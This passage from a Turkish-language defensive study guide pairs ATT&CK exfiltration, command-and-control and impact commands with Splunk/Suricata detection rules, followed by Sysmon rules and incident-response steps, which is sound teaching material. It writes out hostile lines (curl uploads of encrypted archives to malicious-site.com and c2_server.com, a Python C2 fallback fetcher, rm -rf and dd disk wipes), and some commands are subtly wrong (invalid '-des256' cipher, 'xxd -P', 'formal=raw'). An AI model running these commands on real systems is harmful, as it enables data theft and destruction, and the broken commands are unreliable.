   - Exfiltre edilen veriler, gizliliğini korumak için şifrelenir. Bu, tespit edilmeden veri çıkışı sağlamaya yardımcı olabilir.  

4. **Data Transfer Size Limits:**  
   - Verinin çıkışını sınırlayan ağ protokollerindeki boyut kısıtlamalarını aşmak için veri parçalara ayrılarak aktarılır.  

5. **Exfiltration Over Alternative Protocol:**  
   - Veriler, genellikle izlenen standart protokoller yerine alternatif, genellikle daha az dikkat çeken protokoller üzerinden dışarıya aktarılır.  

6. **Exfiltration Over C2 Channel:**  
   - Komuta ve kontrol (C2) kanalını kullanarak verilerin dışarıya aktarılması. Bu, saldırganın kontrol ettiği bir kanal üzerinden yapılır.

#### **Automated Exfiltration**  

- **Attack Commands**

```bash
tar -czf - sensitive_data/ | openssl enc -out encrypted_datatar.qz -des256 -pass pass:"SECRETKEY" && curl -X POST -F data=@encrypted_datatar.qz http://malicious-site.com/upload
```

- **Açıklama:**  
  - `tar` komutu ile veri sıkıştırılır, ardından `openssl` ile şifrelenir. Şifreli veri daha sonra `curl` komutu ile kötü amaçlı bir siteye gönderilir.

- **Detection Rules**  

**1. Splunk Rule:**

```plaintext
index=weblogs method=POST uri="*tar.qz"
```

- Bu kural, web sunucusunda `tar.qz` uzantılı dosyaların POST isteği ile gönderilmesini tespit eder.

**2. Suricata Rule:**

```plaintext
alert http any any -> any any (msg:"Potential Data Exfiltration"; 
flow:to_server; 
content:"POST"; http_method; 
content:"tar.qz"; http_uri; 
classtype:data-leak; sid:1000012;)
```

- Suricata, HTTP trafiğinde `tar.qz` içeren POST isteği tespit eder ve olası bir veri sızması alarmı verir.

#### **Data Compressed**

- **Attack Commands**

```bash
zip -r compressed_data.zip sensitive_data_folder
```

- **Açıklama:**  
  - `zip` komutu kullanılarak, hassas veriler içeren bir klasör sıkıştırılır ve `.zip` formatında bir dosya oluşturulur. Bu, veri exfiltration sürecinin bir parçası olabilir.

- **Detection Rules**  

**1. Splunk Rule:**

```plaintext
index=weblogs method=POST uri="*zip"
```

- Bu kural, web sunucusuna yapılan POST isteklerinde `.zip` uzantılı dosya gönderimini tespit eder. Bu, veri dışa çıkışı (exfiltration) için kullanılan bir yöntem olabilir.

**2. Suricata Rule:**

```plaintext
alert http any any -> any any (msg:"Potential ZIP File Upload"; 
flow:to_server; 
content:"POST"; http_method; 
content:"zip"; http_uri; 
classtype:data-leak; sid:1000014;)
```

- Suricata, HTTP trafiğinde `.zip` dosyasının POST yöntemiyle dışarıya gönderilmesini tespit eder ve olası bir veri sızmasını (data leak) alarmıyla bildirir.

#### **Data Encrypted**  

- **Attack Commands**

```bash
openssl enc -des-256-cbc -salt -in sensitive_data.txt -out sensitive_data.txt.enc
```

- **Açıklama:**  
  - `openssl enc` komutu kullanılarak, hassas veriler şifrelenir ve şifreli bir dosya (`.enc` uzantılı) oluşturulur. Bu şifrelenmiş veri daha sonra dışarıya aktarılabilir.

- **Detection Rules**  

**1. Splunk Rule:**

```plaintext
index=weblogs method=POST uri="*enc"
```

- Bu kural, web sunucusuna yapılan POST isteklerinde `.enc` uzantılı şifreli dosya gönderimlerini tespit eder.

**2. Suricata Rule:**

```plaintext
alert http any any -> any any (msg:"Potential Encrypted Data Upload"; 
flow:to_server; 
content:"POST"; http_method; 
content:"enc"; http_uri; 
classtype:data-leak; sid:1000015;)
```

- Suricata, HTTP trafiğinde `.enc` uzantılı dosyanın POST yöntemiyle gönderilmesini tespit eder ve potansiyel bir şifreli veri sızması alarmı verir.

#### **Exfiltration Over C2 Channel**

- **Attack Commands**

```bash
curl -X POST -F 'data=@sensitive_data.txt' http://c2_server.com/upload
```

- **Açıklama:**  
  - `curl` komutu kullanılarak, hassas veriler kötü amaçlı bir komut ve kontrol (C2) sunucusuna gönderilir. Veri, `POST` yöntemiyle `upload` endpoint'ine aktarılır.

- **Detection Rules**  

**1. Splunk Rule:**

```plaintext
index=weblogs method=POST uri="/upload"
```

- Bu Splunk kuralı, web sunucusuna yapılan POST isteklerinde `/upload` uri'ye sahip veri gönderimlerini tespit eder. Bu, olası bir veri dışa çıkışı (exfiltration) kanalı olabilir.

**2. Suricata Rule:**

```plaintext
alert http any any -> any any (msg:"Suspicious Data Upload to C2"; 
flow:to_server; 
content:"POST"; http_method; 
content:"/upload"; http_uri; 
classtype:data-leak; sid:1000016;)
```

- Suricata, HTTP trafiğinde C2 sunucusuna yapılan şüpheli veri yükleme işlemlerini tespit eder ve potansiyel bir veri dışa çıkışı (data leak) alarmı verir.

### **Command and Control**

- **Commonly Used Port:** Yaygın portlar üzerinden C2 iletişimi.
- **Connection Proxy:** Proxy kullanarak izlemeyi zorlaştırma.
- **Custom Cryptographic Protocol:** Kendi şifreleme protokollerini kullanma.
- **Data Encoding:** Veriyi gizlemek için kodlama.
- **Domain Generation Algorithms (DGA):** Rastgele domain isimleri ile C2 sunucularına bağlanma.
- **Fallback Channels:** Birincil kanal başarısızsa alternatif kanal kullanma.
- **Multi-hop Proxy:** Birden fazla proxy kullanarak trafiği yönlendirme.
- **Multi-Stage Channels:** Veri iletimini birden fazla aşamada yapma.
- **Web Service:** Web servisleri üzerinden C2 iletişimi.

#### **Connection Proxy**  

- **Attack Commands**  
a. **Simple Proxy Creation with Netcat**

```bash
nc -lvp 9999  
```

- Netcat kullanarak basit bir proxy oluşturulabilir. Bu komut, belirli bir port üzerinde dinlemeye başlar.

ii. **Proxy Chain with Netcat**

```bash
nc -lvp 8888 | nc TARGET_IP 9999
```

- Bu komut, iki Netcat instance'ı kullanarak bağlantıyı bir hedef IP'ye yönlendirir.

b. **Using SSH Tunnel**

```bash
ssh -D 8080 compromised_host
```

- SSH tüneli oluşturularak, hedef makinelerle güvenli proxy iletişimi sağlanır.

- **Detection Rules**  

**1. Splunk Rule:**

```plaintext
index=network sourcetype=traffic (dst_port=8080 OR src_port=8080) 
| stats count by src_ip, dst_ip 
| where count > THRESHOLD
```

- Bu Splunk kuralı, 8080 portunu kullanan trafiği izler ve bu port üzerinden yüksek sayıda bağlantı tespit edilirse alarm verir.

**2. Suricata Rule:**

```plaintext
alert tcp any any -> any 8080 (msg:"Possible Proxy Communication on port 8080"; flow:established; threshold type limit, track by_src, count 10, seconds 60; sid:1000002;)
```

- Suricata, 8080 portu üzerinden yapılan proxy iletişimini tespit eder ve belirli bir süre içinde belirli sayıda bağlantı yapıldığında alarm verir.

#### **Data Encoding**  

- **Attack Commands**  

**a. Data Encoding with Base64:**  
i. **Encoding data with Base64:**

```bash
echo -n "secret_data" | base64
```

- Bu komut, "secret_data" verisini Base64 formatında kodlar.

ii. **Decoding Base64 encoded data:**

```bash
echo -n "c2VjcmVfZGF0YQ==" | base64 --decode
```

- Base64 ile kodlanmış veriyi çözmek için bu komut kullanılır.

**b. Data Encoding with Hexadecimal:**

i. **Encoding data with hexadecimal:**

```bash
echo -n "secret_data" | xxd -P
```

- Veriyi hexadecimal formatında kodlamak için kullanılır.

ii. **Decoding hexadecimal encoded data:**

```bash
echo -n "7365637265745f64617461" | xxd -r -p
```

- Hexadecimal formatta kodlanmış veriyi çözmek için kullanılır.

- **Detection Rules**  

**1. Splunk Rule:**

```plaintext
index=network_data | regex row="--)"
```

- Bu Splunk kuralı, Base64 veya benzer veri kodlamalarını tespit etmek için regex kullanır.

**2. Suricata Rule:**

```plaintext
alert tcp any any -> any any (msg:"Possible Base64 Encoded Data Detected"; content:"|3D 3D|"; depth:4; sid:1000010;)
```

- Suricata, Base64 ile kodlanmış veriyi tespit etmeye yönelik bir kural kullanır. Belirtilen içerik "I3D 3DI" tespit edildiğinde alarm verir.

#### **Fallback Channels**  

- **Attack Commands**  

**a. A Simple Fallback Mechanism with Python:**

```python
import requests

primary_c2 = "http://primary-c2.com/command"
fallback_c2 = "http://fallback-c2.com/command"

try:
    response = requests.get(primary_c2)
    command = response.text
except:
    response = requests.get(fallback_c2)
    command = response.text
```

- Bu Python betiği, birincil C2 sunucusuna bağlantı kurulamazsa alternatif (fallback) bir C2 sunucusuna başvurur.

- **Detection Rules**  

**1. Splunk Rule:**

```plaintext
index=network_logs sourcetype=web_traffic
| stats count by src_ip, dest_ip
| where count > 1
| sort - count
```

- Bu Splunk kuralı, birden fazla C2 bağlantısı üzerinden iletişim kurmayı tespit etmek için src_ip ve dest_ip'yi analiz eder.

**2. Suricata Rule:**

```plaintext
alert http any any -> any 80 (msg:"Possible Fallback C2 Connection Detected"; flow:established, to_server; content:".com/command"; depth:12; flowbits:set,fallback_c2; flowbits:noalert; sid:2000010;)
alert http any any -> any 80 (msg:"Possible Fallback C2 Connection Detected"; flow:established, to_server; content:".com/command"; depth:12; flowbits:isset,fallback_c2; sid:2000011;)
```

- Suricata, ".com/command" içeriğini içeren HTTP trafiğini izler ve alternatif bir C2 sunucusuna bağlantı tespit edildiğinde alarm verir.

#### **Multi-hop Proxy**  

- **Attack Commands**  

**a. SSH Multi-hop:**

```bash
ssh -L 8080:localhost:8081 user@B -N
```

- Bu komut, B sunucusuna SSH üzerinden bağlanır ve yerel 8080 portunu uzak 8081 portuna yönlendirir.

```bash
ssh -L 8080:localhost:22 user@C -N
```

- Bu komut, C sunucusuna SSH üzerinden bağlanır ve yerel 8080 portunu uzak 22 portuna yönlendirir.

- **Detection Rules**  

**1. Splunk Rule:**

```plaintext
index=ssh_logs action=success
| stats count by src_ip, dest_ip
| where count > 1
| sort -count
```

- Bu Splunk kuralı, başarılı SSH bağlantılarını izler ve aynı IP adresinden birden fazla farklı sunucuya yapılan bağlantıları tespit eder.

**2. Suricata Rule:**

```plaintext
alert tcp any any -> any 22 (msg:"SSH traffic detected"; flow:established, to_server; content:"SSH-20"; depth:8; sid:2000020;)
```

- Suricata, 22 numaralı portta (SSH) ile yapılan bağlantıları izler ve SSH trafiği tespit ettiğinde alarm verir.

### **Impact**  

- **Data Destruction:** Verilerin silinmesi, genellikle saldırganların verileri tamamen kaybetmesini sağlamak amacıyla yapılır.
- **Data Encrypted for Impact:** Verilerin şifrelenmesi, kullanıcıların verilere erişimini engelleyerek önemli verileri kullanılmaz hale getirmeyi hedefler.
- **Data Manipulation:** Verilerin manipüle edilmesi, sistemdeki verilerin değiştirilmesi, sahte bilgiler eklenmesi veya mevcut bilgilerin silinmesi anlamına gelir.
- **Defacement:** Hedeflenen web sayfasının veya sistemin görsel olarak değiştirilmesi, genellikle bir mesaj veya propaganda amacıyla yapılır.
- **Disk Content Wipe:** Diskteki tüm verilerin silinmesi, geri dönüşümü imkansız hale getiren bir tür veri yok etme işlemidir.
- **Disk Structure Wipe:** Diskin yapısal bilgilerini silme, sistemin yeniden yapılandırılmasını zorlaştırarak çalışmasını engellemeyi amaçlar.
- **Endpoint Denial of Service:** Bir uç noktayı (örneğin, bir sunucu veya cihaz) kullanılmaz hale getirmek için yapılan hizmet reddi saldırısıdır.
- **Firmware Corruption:** Cihazın donanım yazılımının (firmware) bozulması, cihazın çalışamaz hale gelmesini sağlar.
- **Inhibit System Recovery:** Sistemin kurtarılmasını engelleme, genellikle kötü amaçlı yazılımlar ile yapılır ve kurtarma araçlarının işlevselliğini bozar.
- **Resource Hijacking:** Kaynakların (işlemci gücü, bellek, vb.) yasa dışı bir şekilde ele geçirilmesi, genellikle madencilik ve botnet faaliyetlerinde görülür.
- **Runtime Data Manipulation:** Çalışan bir uygulamanın veya sistemin verilerinin anlık olarak değiştirilmesi, örneğin bir işlemdeki verilerin değiştirilmesi.
- **Service Stop:** Sistem servislerinin durdurulması, hizmetlerin kesilmesine ve sistemin işlevselliğinin bozulmasına yol açar.
- **Stored Data Manipulation:** Depolanan verilerin değiştirilmesi, genellikle sistemdeki mevcut verilerin sahte verilere dönüştürülmesi amacıyla yapılır.
- **System Shutdown/Reboot:** Sistemlerin kapatılması veya yeniden başlatılması, sistemin kullanımını engellemek için yapılabilir.
- **Transmitted Data Manipulation:** Ağ üzerinden iletilen verilerin değiştirilmesi, bu saldırılar genellikle veri iletiminde manipülasyon yapmayı hedefler.

#### **Data Destruction**  

- **Attack Commands**  

**a. Deleting a specific file in Linux:**

```bash
rm /path/to/important/file.txt
```

- Linux sistemde önemli bir dosyayı silme komutu.

**b. Deleting a specific file in Windows:**

```bash
del C:\path\to\important\file.txt
```

- Windows sistemde belirli bir dosyayı silme komutu.

**c. Deleting a directory and its contents in Linux:**

```bash
rm -rf /path/to/important/directory/
```

- Bir dizin ve içeriğini silmek için kullanılan Linux komutu.

**d. Destroy all data on a partition:**

```bash
dd if=/dev/urandom of=/dev/sdX bs=4M
```

- Bir disk bölümündeki tüm verileri rasgele verilerle yazmak için kullanılan Linux komutu.

- **Detection Rules**

**1. Splunk Rule:**

```plaintext
index=winlogs EventCode=4663 ObjectType="File"
| regex _raw=".*Delete.*"
| table _time, host, ObjectName, SubjectUserName
```

- Bu Splunk kuralı, silme işlemi gerçekleştiren olayları izler ve dosya silme faaliyetleri hakkında bilgi toplar.

**2. Suricata Rule:**

```plaintext
alert tcp any any -> $HOME_NET any (msg:"Possible Data Destruction Command"; content:"rm -rf"; sid:1000001; rev:1;)
```

- Suricata, `rm -rf` komutunu tespit ederek veri yok etme faaliyetlerine karşı alarm verir.

#### **Data Encrypted for Impact**  

- **Attack Commands**  

**a. To AES-256 encrypt the contents of a file with OpenSSL:**

```bash
openssl enc -aes-256-cbc -salt -in file.txt -out file.txt.enc
```

- OpenSSL ile dosyanın AES-256 şifrelemesi.

**b. File encryption with GPG:**

```bash
gpg -c file.txt
```

- GPG ile dosya şifreleme komutu.

- **Detection Rules**

**1. Splunk Rule:**

```plaintext
index=perfmon sourcetype=Perfmon CPU
| where PercentProcessorTime > 90
| eval process=mvindex(split(_raw, " "), -1)
| table _time, host, process, PercentProcessorTime
```

- Bu Splunk kuralı, işlemci kullanım oranı %90'ın üzerinde olan olayları tespit eder. Bu, şifreleme süreçlerinin yüksek CPU kullanımı nedeniyle anlaşılabilir.

**2. Suricata Rule:**

```plaintext
alert http any any -> $HOME_NET any (msg:"Potential Ransomware C2 Communication"; content:"YOUR_FILES_ARE_ENCRYPTED"; http_uri; sid:2000001; rev:1;)
```

- Suricata, şifrelenmiş dosyalarla ilgili ransomware (fidye yazılımı) saldırılarını tespit etmeye çalışır ve şüpheli C2 (Command and Control) iletişimi için alarm verir.

## **SYSMON Features**

Sysmon (System Monitor), Microsoft'un bir araç seti olan Sysinternals'ın parçasıdır ve Windows işletim sistemlerinde gelişmiş olay izleme sağlar. Sysmon, sistemdeki önemli aktiviteleri, özellikle kötü amaçlı yazılımları tespit etmek ve analiz etmek için kullanılır.

- **Process creation and change tracking:**
  - Sistemde yeni süreçlerin oluşturulmasını ve mevcut süreçlerdeki değişiklikleri izler.
  
- **Reporting file creation time:**
  - Dosya oluşturulma zamanlarını raporlar. Bu, dosyaların ne zaman oluşturulduğunu takip etmenizi sağlar.

- **Network connection monitoring:**
  - Ağ bağlantılarını izler, IP adresleri, portlar ve bağlantı türleri hakkında bilgi toplar.

- **Monitoring driver downloads:**
  - Sürücü indirmelerini takip eder ve bu aktiviteleri kaydeder, özellikle kötü amaçlı yazılım tespiti için önemlidir.

- **Raw disk access monitoring:**
  - Disk erişimlerini izler. Veritabanı veya kritik dosya sistemlerine yapılan doğrudan erişimleri algılar.

- **Process memory access monitoring:**
  - Bellek erişimlerini izler, bir süreç diğerinin belleğine erişim sağladığında raporlar.

### **Rule Writing Example**

Sysmon konfigürasyon dosyasında, belirli süreçlerin izlenmesi için bir örnek kural yazımı:

```xml
<Sysmon schemaversion="4.50">
    <EventFiltering>
        <ProcessCreate onmatch="include">
            <Image condition="is">cmd.exe</Image>
        </ProcessCreate>
    </EventFiltering>
</Sysmon>
```

- **Açıklama:** Bu kural, **cmd.exe** gibi belirli bir işlem oluşturulduğunda Sysmon'a rapor edilmesi talimatı verir. **onmatch="include"** ifadesi, bu işlemle eşleşen olayları dahil etmek için kullanılır.

**Sysmon Kural Geliştirme**: Sysmon ile belirli sistem olaylarını izlemenin ve filtrelemenin yolu, olay türlerini (Event Type) belirlemek ve bu olaylara özel koşullar (condition) eklemektir. Örneğin, bir uygulamanın ağ bağlantılarını izlemek için Sysmon kuralı yazabilirsiniz.

**Örnek Kural Yapısı:**

1. **Event Type**: İzlemek istediğiniz olay türünü belirtir (Örneğin, `ProcessCreate`, `NetworkConnect`, `FileCreate`).
2. **onmatch**: Olayın, koşula göre dahil edilip edilmediğini belirler. (`include` veya `exclude`).
3. **condition**: İzlenen koşulu tanımlar (Örneğin, `is`, `contains`, `startsWith`, `endsWith` gibi).
4. **value**: İzlemek istediğiniz değeri belirtir.

### **Örnek 1: Sysmon Kuralı (Chrome.exe Ağ Bağlantılarını İzlemek)**

```xml
<Sysmon schemaversion="4.50">
  <EventFiltering>
    <NetworkConnect onmatch="include">
      <Image condition="is">chrome.exe</Image>
    </NetworkConnect>
  </EventFiltering>
</Sysmon>
```

- **Açıklamalar:**

- **NetworkConnect**: Ağ bağlantısı olayını izler.
- **onmatch="include"**: `chrome.exe` için ağ bağlantıları dahil edilir.
- **Image condition="is"**: İşlem adı olarak "chrome.exe"yi arar ve buna göre filtreleme yapar.

Bu kural, sadece **chrome.exe** adlı işlem için yapılan ağ bağlantılarını izleyecektir. Sysmon, çok sayıda farklı olay türünü izleyebilmenizi sağlar ve bu olaylar için özel kurallar oluşturulabilir.

**SYSMON Kural Geliştirme - Örnekler**:

### **Örnek 2: Belirli Bir IP'ye Yapılan Tüm Ağ Bağlantılarını Hariç Tutma**

Bu kural, belirli bir IP adresine yapılan ağ bağlantılarını dışlar.

```xml
<Sysmon schemaversion="4.50">
  <EventFiltering>
    <NetworkConnect onmatch="exclude">
      <DestinationIp condition="is">10.0.0.5</DestinationIp>
    </NetworkConnect>
  </EventFiltering>
</Sysmon>
```

- **NetworkConnect**: Ağ bağlantısı olaylarını izler.
- **onmatch="exclude"**: Bu kural, belirli IP'ye yapılan bağlantıları dışlar.
- **DestinationIp condition="is"**: Bağlantının hedef IP adresi olarak `10.0.0.5`i arar.

### **Örnek 3: Belirli Bir Dosya Uzantasının Oluşumunu İzlemek**

Bu kural, belirli bir dosya uzantasıyla yapılan dosya oluşturma işlemlerini izler.

```xml
<Sysmon schemaversion="4.50">
  <EventFiltering>
    <FileCreate onmatch="include">
      <TargetFilename condition="endsWith">.psk</TargetFilename>
    </FileCreate>
  </EventFiltering>
</Sysmon>
```

- **FileCreate**: Dosya oluşturulma olaylarını izler.
- **onmatch="include"**: `.psk` uzantılı dosyaların oluşturulması dahil edilir.
- **TargetFilename condition="endsWith"**: Dosya adı `.psk` ile biten dosyaları izler.

Bu tür kurallar, Sysmon'un güçlü özelliklerini kullanarak belirli olayları izlemek ve gerektiğinde dışlamak için oldukça esnektir.

## **IR : Containment, Eradication & Remediation and Lessons Learned**

### **Containment**

Containment, bir siber güvenlik olayı sırasında tehditin yayılmasını engellemek ve zararını sınırlamak amacıyla uygulanan önlemleri ifade eder. İki ana aşamada ele alınabilir:

**1. Kısa Vadeli (Anlık) Sınırlama:**

- Tehditin yayılmasını hızlı bir şekilde durdurmak amacıyla alınan acil tedbirler.
- Bu adımlar, tehdit kaynağını izole etmek ve daha fazla zarar vermesini engellemek için önemlidir.
  
**2. Uzun Vadeli (Stratejik) Sınırlama:**

- Tehditin ortadan kaldırılmasının ardından uzun vadede uygulanacak stratejik çözümler.
- Bu aşama, kalıcı koruma önlemleri geliştirilerek, gelecekteki benzer tehditlere karşı savunmanın güçlendirilmesini amaçlar.

**Örnekler:**

1. **Ağ İzolasyonu:**
   - Ağdaki şüpheli cihazların veya ağ segmentlerinin izole edilmesi, tehditin yayılmasını engeller.
   - **Örnek:** Tehditli cihazlardan gelen trafik dışa yönlendirilip engellenebilir.
  
2. **Trafik Filtreleme:**
   - Zararlı trafiği tespit etmek ve engellemek için ağ trafiği filtrelenir.
   - **Örnek:** İstenmeyen IP adresleri, portlar veya protokoller engellenebilir.

3. **Hesapların Askıya Alınması:**
   - Tehditli veya tehlikeye giren hesaplar askıya alınarak saldırganların yetkileri kısıtlanabilir.
   - **Örnek:** Yönetici hesapları veya kritik sistemlere erişim sağlayan hesaplar geçici olarak devre dışı bırakılabilir.

4. **Kötü Amaçlı Yazılımın Kaldırılması:**
   - Saldırganların sistemdeki zararlı yazılımları çalıştırmasını engellemek için kötü amaçlı yazılımın silinmesi sağlanır.
   - **Örnek:** Antivirüs araçları veya manuel temizleme yöntemleriyle kötü amaçlı yazılım kaldırılabilir.

#### **Suspension of Accounts (Hesapların Askıya Alınması)**

Hesapların askıya alınması, bir saldırganın sistemdeki hesapları kullanarak daha fazla zarar vermesini engellemek için etkili bir stratejidir. Bu işlem, saldırganın erişimini kesmek için uygulanır.

- **Attack (Saldırı)**

- **Windows:**
  - Saldırgan, belirli bir kullanıcıyı devre dışı bırakmak için aşağıdaki komutu kullanabilir:

    ```bash
    net user <username> /active:no
    ```

    Bu komut, kullanıcının Windows sistemine erişimini geçici olarak devre dışı bırakır.
  
- **Linux:**
  - Saldırgan, bir kullanıcıyı devre dışı bırakmak için şu komutu kullanabilir:

    ```bash
    passwd -l <username>
    ```

    Bu komut, belirtilen kullanıcı hesabını kilitler ve giriş yapmasını engeller.

#### **Defense (Savunma)**

- **Windows:**
  - Sistem yöneticisi, bir kullanıcıyı askıya almak için şu komutu kullanabilir:
  
    ```bash
    net user <username> /active:no
    ```

    Bu, saldırganın hesapları kullanmaya devam etmesini engeller.

- **Linux:**
  - Kullanıcıyı askıya almak için şu adımlar takip edilebilir:
    - **Kullanıcı Durumunu Kontrol Etme:**

      ```bash
      cat /etc/passwd
      ```

    - **Kullanıcıyı Kilitleme (Devre Dışı Bırakma):**

      ```bash
      passwd -l <username>
      ```

      Bu komut, kullanıcı şifresini devre dışı bırakır ve hesapta oturum açılmasını engeller.

Hesap askıya alma işlemi, saldırganın hesapları kullanarak sistemdeki veriye erişimini engellemenin yanı sıra, olası veri kaybını ve sistemdeki zararı sınırlamaya yardımcı olur.

#### **Isolation (İzolasyon)**

İzolasyon, saldırganın sistemle daha fazla etkileşime girmesini engellemek için kritik bir adımdır. Bu işlem, saldırganın sistemle olan ağ bağlantısını kesmeyi amaçlar. Bu sayede daha fazla veri çalınması, zararlı yazılım yayılması veya başka zararlı aktivitelerin gerçekleştirilmesi önlenir.

- **Attack (Saldırı)**

- **Windows Environment:**
  - **Ağı Devre Dışı Bırakmak:**
    Saldırgan, ağ bağlantısını devre dışı bırakmak için şu komutu kullanabilir:

    ```bash
    netsh interface set interface "Interface Name" admin-disable
    ```

    Bu komut, belirli bir ağ arabirimini devre dışı bırakır ve cihazın ağ üzerinden iletişim kurmasını engeller.
  
- **Linux Environment:**
  - **Ağı Devre Dışı Bırakmak:**
    Saldırgan, Linux ortamında ağ arabirimini kapatmak için şu komutu kullanabilir:

    ```bash
    ifconfig ethX down
    ```

    Bu komut, belirtilen ağ arabirimini (ethX) kapatarak ağ bağlantısını keser.

- **Defense (Savunma)**

- **Windows Environment:**
  - **Bir Bilgisayarı Ağdan İzole Etmek:**
    Savunma önlemi olarak, bir bilgisayar ağdan izole edilebilir:

    ```bash
    netsh interface set interface "Interface Name" admin-disable
    ```

    Bu komut, cihazın ağ bağlantısını keser.
  - **Tüm Giriş ve Çıkış Bağlantılarını Engellemek (Windows Firewall Kullanarak):**
    Ağ trafiğini tamamen engellemek için şu komut kullanılabilir:

    ```bash
    netsh advfirewall set allprofiles state on
    ```

    Bu, tüm ağ profillerinde (Domain, Private, Public) gelen ve giden bağlantıları engeller.

- **Linux Environment:**
  - **Bir Bilgisayarı Ağdan İzole Etmek:**
    Linux ortamında, bir bilgisayarın ağ bağlantısını kesmek için şu komut kullanılabilir:

    ```bash
    ifconfig ethX down
    ```

    Bu komut, belirtilen ağ arabirimini kapatır ve cihazın ağ üzerinden iletişim kurmasını engeller.
  - **Tüm Gelen/Çıkan Bağlantıları Bloke Etmek (iptables Kullanarak):**
    Aşağıdaki komutlarla tüm ağ trafiği engellenebilir:

    ```bash
    iptables -P INPUT DROP
    iptables -P OUTPUT DROP
    iptables -P FORWARD DROP
    ```

    Bu, cihazın ağdan veri almasını, göndermesini ve diğer cihazlarla iletişim kurmasını engeller.

İzolasyon, sistemin daha fazla zarar görmesini engellemek için kritik bir adımdır ve doğru yapılandırıldığında saldırganın ağ üzerinden herhangi bir işlem yapmasını engeller.

#### **Isolation (Savunma - İzolasyon)**

Bu bölümde, saldırganın sisteme daha fazla zarar vermesini engellemek için ağ trafiği veya uygulama erişiminin nasıl engellenebileceği ve kontrol altına alınacağına dair savunma önlemleri ele alınmıştır. Bu yöntemler, ağ trafiğini kontrol ederek kötü niyetli işlemleri sınırlamaya yardımcı olur.

- **Defense (Savunma)**

- **Windows:**

1. **Belirli bir IP Adresine Trafiği Durdurmak (Windows Firewall ile):**
   Bir belirli IP adresine çıkan trafiği engellemek için şu komut kullanılabilir:

   ```bash
   netsh advfirewall firewall add rule name="IP Block" dir=out interface=any action=block remoteip=192.168.1.10
   ```

   Bu komut, 192.168.1.10 IP adresine çıkış trafiğini engeller.

2. **Belirli Bir Uygulamanın Ağ Erişimini Engellemek (Windows Firewall ile):**
   Belirli bir uygulamanın ağ erişimini engellemek için şu komut kullanılabilir:

   ```bash
   netsh advfirewall firewall add rule name="BlockApp" dir=out program="C:\path\to\app.exe" action=block
   ```

   Bu komut, belirtilen uygulamanın ağ üzerinden veri göndermesini engeller.

3. **Belirli Bir Port Üzerindeki Trafiği Engellemek (Örneğin: SMB için 445 portu):**
   SMB protokolü için 445 numaralı portu engellemek için şu komut kullanılabilir:

   ```bash
   netsh advfirewall firewall add rule name="BlockPort445" dir=in action=block protocol=TCP localport=445
   ```

   Bu, SMB trafiğini engeller.

- **Linux:**

1. **Belirli Bir IP Adresine Trafiği Bloke Etmek (iptables ile):**
   192.168.1.10 IP adresine giden trafiği engellemek için şu komut kullanılabilir:

   ```bash
   iptables -A OUTPUT -d 192.168.1.10 -j DROP
   ```

   Bu komut, belirli bir IP adresine giden çıkış trafiğini engeller.

2. **Belirli Bir Port Üzerindeki Trafiği Engellemek (Örneğin: SSH için 22 portu):**
   SSH trafiği için 22 numaralı portu engellemek için şu komut kullanılabilir:

   ```bash
   iptables -A INPUT -p tcp --dport 22 -j DROP
   ```

   Bu, SSH trafiğini engeller.

3. **Belirli Bir MAC Adresinden Gelen Trafiği Bloke Etmek (iptables ile):**
   Belirli bir MAC adresinden gelen trafiği engellemek için şu komut kullanılabilir:

   ```bash
   iptables -A INPUT -m mac --mac-source 00:11:22:33:44:55 -j DROP
   ```

   Bu komut, belirtilen MAC adresinden gelen trafiği engeller.

4. **Belirli Bir IP Aralığından Gelen Trafiği Engellemek:**
   Bir IP aralığından gelen trafiği engellemek için şu komut kullanılabilir:

   ```bash
   iptables -A INPUT -s 192.168.1.0/24 -j DROP
   ```

   Bu komut, belirtilen IP aralığından gelen tüm trafiği engeller.

#### **RAM Analyses (Savunma - RAM Analizi)**

RAM analizi, bir sistemdeki aktif süreçleri, ağ bağlantılarını ve diğer kritik bilgileri inceleyerek saldırıları tespit etmek ve anlamak için kullanılır. Bu analiz, saldırganın kötü niyetli yazılımının bellekte aktif olup olmadığını belirlemeye ve şüpheli aktiviteleri takip etmeye yardımcı olur.

- **Defense (Savunma)**

##### **Windows Environment (Windows Ortamı)**

1. **Memory Image Acquisition (Bellek Görüntüsü Alımı):**
   Windows ortamında, belleğin bir görüntüsünü almak için şu komut kullanılabilir:

   ```bash
   winpmem 21rc3.exe -o memorydump.raw
   ```

   Bu komut, belleğin bir kopyasını `memorydump.raw` adlı dosyaya kaydeder.

2. **Analysis with Volatility (Volatility ile Analiz):**
   - **Mevcut Süreçleri Listeleme:**

     Aşağıdaki komut, bellek dökümünden aktif süreçlerin listesini alır:

     ```bash
     volatility -f memorydump.raw --profile=Win7SP1x64 pslist
     ```

   - **Ağ Bağlantılarını Listeleme:**
  
     Bu komut, ağ bağlantılarını gösterir:

     ```bash
     volatility -f memorydump.raw --profile=Win7SP1x64 netscan
     ```

   - **Şüpheli Dosya ve DLL’leri Listeleme:**
     Bellek dökümündeki şüpheli dosyaları ve DLL'leri listelemek için şu komut kullanılabilir:

     ```bash
     volatility -f memorydump.raw --profile=Win7SP1x64 dlllist
     ```

##### **Linux Environment (Linux Ortamı)**

1. **Memory Image Acquisition (Bellek Görüntüsü Alımı):**
   Linux ortamında bellek görüntüsü almak için şu komut kullanılabilir:

   ```bash
   insmod lime-<kernel_version>.ko "path=/path/to/output.mem formal=raw"
   ```

   Bu komut, bellek dökümünü belirtilen yol ve formatta alır.

2. **Analysis with Volatility (Volatility ile Analiz):**
   - **Mevcut Süreçleri Listeleme:**
     Aşağıdaki komut, Linux ortamındaki aktif süreçleri listeler:

     ```bash
     volatility -f output.mem --profile=LinuxUbuntu_x64 linux_pslist
     ```

   - **Ağ Bağlantılarını Listeleme:**
     Ağ bağlantılarını incelemek için şu komut kullanılabilir:

     ```bash
     volatility -f output.mem --profile=LinuxUbuntu_x64 linux_netstat
     ```

   - **Yüklenen Modülleri Görüntüleme:**
     Sistemde yüklü olan modülleri listelemek için şu komut kullanılabilir:

     ```bash
     volatility -f output.mem --profile=LinuxUbuntu_x64 linux_smod
     ```

### **Eradication (Kök Sebep Temizliği)**

Eradication, siber güvenlik olayları sonrası tehditlerin sistemden tamamen temizlenmesi ve güvenliğin tekrar sağlanması sürecidir. Bu aşama, tespit edilen kötü amaçlı yazılımların kaldırılmasını, sistemdeki güvenlik açıklarının kapatılmasını ve daha güçlü güvenlik önlemlerinin alınmasını içerir.

#### **1. Detection of Malware (Kötü Amaçlı Yazılım Tespiti)**

